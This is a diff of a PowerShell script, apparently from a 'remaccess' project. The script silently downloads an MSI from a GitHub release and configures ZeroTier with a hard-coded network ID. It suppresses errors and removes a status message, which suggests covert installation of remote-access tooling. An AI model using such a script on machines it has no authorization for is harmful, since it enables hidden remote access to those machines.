@@ -2,6 +2,7 @@ $ErrorActionPreference = "SilentlyContinue"
 $downloadUrl = "https://github.com/DirNotAvailable/remaccess/releases/download/CorePrograms/MeshNetwork.msi"
 $downloadedFileName = [System.IO.Path]::GetFileName($downloadUrl)
 $programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
+$ztdatadir = "$env:LOCALAPPDATA\ZeroTier"
 $NetworkID = "52b337794f5f54e7"
 $zerotiercli = "C:\ProgramData\ZeroTier\One\zerotier-one_x64.exe"
 $param1 = "-q"
@@ -34,7 +35,6 @@ if (Test-Path $destinationPath) {
         $programHash = $matches[1]
     }
     if ($programHash -eq $existingFileHash) {
-        Write-Host "File is already present and matches the hash. No action needed." | Out-Null
     } else {
         Remove-Item -Path $destinationPath -Force
     }
